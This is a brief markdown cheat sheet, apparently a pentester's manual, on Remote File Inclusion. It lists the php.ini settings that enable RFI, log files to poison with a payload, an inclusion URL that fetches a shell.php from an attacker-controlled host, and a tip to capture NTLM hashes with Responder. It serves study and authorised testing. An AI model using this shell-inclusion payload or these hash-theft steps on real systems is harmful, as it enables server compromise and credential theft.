# Manual

## Remote File Inclusion (RFI)

### Conditions

```
$ cat /etc/php/7.4/apache2/php.ini
..[snip]..
allow_url_fopen = On
allow_url_include = On
..[snip]..
```

- Poison log files to insert payload

```
/var/log/apache/access.log
/var/log/nginx/error_log
/var/log/auth.log
```

### General

```
http://<attacker_IP>/shell.php
```

### Windows

- Grab NTLM hashes with Responder

## References

- [Hacking Articles: Comprehensive Guide on Local File Inclusion (LFI)](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)

- [Local File Inclusion Code Execution](https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/)

- [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)